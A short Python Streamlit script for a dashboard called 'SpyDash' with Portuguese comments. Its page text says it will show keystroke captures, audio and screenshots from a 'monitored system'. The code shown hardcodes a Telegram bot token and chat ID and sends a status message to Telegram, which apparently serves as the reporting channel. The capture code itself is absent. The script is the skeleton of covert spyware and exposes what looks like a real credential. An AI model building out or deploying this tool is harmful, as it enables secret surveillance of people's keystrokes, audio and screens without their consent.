import streamlit as st
import os
import requests
from dotenv import load_dotenv

# Configuração do Telegram
BOT_TOKEN = "8169475379:AAEM3RqcruOrbFd0dBKUMzwDZ5gRPl-FqxU"
CHAT_ID = "5672315001"

# Função para enviar mensagens
def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": mensagem}
    requests.post(url, data=data)

# Painel Streamlit
st.set_page_config(page_title="SpyDash", layout="wide")
st.title("🕵️ SpyDash - Painel de Monitoramento")

st.markdown("### Capturas em tempo real")
st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")

# Envio de mensagem de status
enviar_telegram("✅ SpyDash foi iniciado e está ao vivo no painel de monitoramento.")
